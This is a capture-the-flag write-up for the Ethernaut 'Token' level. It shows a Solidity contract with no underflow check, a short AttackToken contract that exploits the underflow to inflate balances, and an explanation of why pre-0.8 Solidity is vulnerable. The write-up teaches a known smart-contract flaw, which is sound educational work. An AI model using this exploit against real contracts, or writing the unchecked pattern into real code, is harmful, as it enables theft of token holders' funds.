---
description: overflow / underflow in Solidity
---

# 5 - Token

Ethernaut Level5: [Token](https://ethernaut.openzeppelin.com/level/0xbF361Efe3FcEc9c0139dEdAEDe1a76539b288935)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### Goal of this level

* Having more than 20 tokens.

### What you should know before

* Overflow / Underflow in solidity\
  \-> see [here](https://youtu.be/zqHb-ipbmIo)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

There was no overflow/underflow protection before solidity version 0.8

</details>

Use Remix IDE!

```solidity
contract AttackToken {
    Token token;
    // Your wallet address
    address player = 0x34B4ab0479D10FdbAA3b52C8371C7B1BE5c73bb7;
    
    constructor(Token _instanceAddr) public {
        token = _instanceAddr;
    }
    // call this function after transfering the token to this conntract
    function attack() external {
        token.transfer(player, 2);
    }
}
```

Maximum value that  `uint256` variable can have is `2**256 - 1`.

Initial `Token` balance of AttackToken contract is 0.

But when you call `attack()` function, underflow occurs so the balance of AttackToken contract becomes `2**256 - 2`.

```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // underflow occurs
    balances[msg.sender] -= _value; // 2**256 - 2
    balances[_to] += _value; // 2
    return true;
  }
```

You will eventually have 22 tokens after you deploy `AttackToken` contract and call `attack()`.

Done! 😎

## Key Takeaway

* Overflow/Underflow occured in solidity versions before 0.8

